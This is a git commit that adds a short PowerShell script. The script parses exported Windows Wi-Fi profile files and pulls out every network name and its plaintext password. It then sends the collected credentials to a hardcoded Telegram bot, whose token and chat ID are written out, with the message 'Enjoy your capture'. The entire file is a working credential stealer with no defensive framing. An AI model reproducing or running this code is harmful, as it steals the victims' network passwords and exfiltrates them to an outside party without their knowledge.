ad3f82a6d92f43fa7ad089c14d4ebdfdb6479c8e
diezul <55706727+diezul@users.noreply.github.com>
2024-11-10 01:14:16 +0200

    Add files via upload

---
+++ s.ps1
@@ -0,0 +1,20 @@
+$output = @()
+$output += 'Success! There are ' + (Get-ChildItem -Path . -Filter Wi*.xml).Count + ' networks extracted.'
+$output += ' Here is your exported list: '
+Get-ChildItem -Path . -Filter Wi*.xml | ForEach-Object {
+    $xml = [xml](Get-Content $_.FullName)
+    $name = $xml.WLANProfile.name
+    $key = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
+    if ($key) {
+        $output += ' -#|#- NETWORK NAME: ' + $name + ' | PASSWORD: ' + $key
+    }
+}
+$output += ' -#|#- This is it. Enjoy your capture.'
+
+$message = $output -join ''
+$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
+$body = @{
+    'chat_id' = '656189986'
+    'text' = $message
+} | ConvertTo-Json
+Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
